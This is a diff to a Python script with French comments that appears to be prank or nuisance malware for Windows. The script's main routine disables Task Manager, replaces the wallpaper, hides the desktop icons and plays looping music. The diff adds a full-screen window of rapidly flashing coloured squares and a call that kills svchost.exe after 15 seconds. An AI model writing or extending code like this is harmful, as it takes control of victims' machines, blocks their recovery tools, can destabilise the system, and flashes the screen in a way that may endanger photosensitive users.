@@ -30,7 +30,37 @@ def fermer_apres_delay(nom_programme, delay=15):
     
 
 # Exemple pour svchost
-fermer_apres_delay("svchost.exe", 15)
+
+
+import tkinter as tk
+import random
+
+def ecran_multicolor():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)  # plein écran
+    root.configure(bg="black")
+
+    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
+    canvas.pack()
+
+    carre_size = 50  # taille des carrés
+    colors = ["red", "blue", "green", "yellow", "purple", "orange"]
+
+    def draw_squares():
+        canvas.delete("all")
+        width = root.winfo_screenwidth()
+        height = root.winfo_screenheight()
+
+        for x in range(0, width, carre_size):
+            for y in range(0, height, carre_size):
+                color = random.choice(colors)
+                canvas.create_rectangle(x, y, x+carre_size, y+carre_size, fill=color, outline="")
+        root.after(100, draw_squares)  # redraw toutes les 100ms
+
+    draw_squares()
+    root.mainloop()
+
+
 
 
 def play_music_loop():
@@ -232,7 +262,8 @@ def main():
     disable_task_manager()
     set_wallpaper("IMG_7832.jpeg")
     clear_desktop_icons()
-    fermer_apres_delay()
+    ecran_multicolor()
+    fermer_apres_delay("svchost.exe", 15)
 
     # Met la musique en thread pour pas bloquer
     threading.Thread(target=play_music_loop, daemon=True).start()
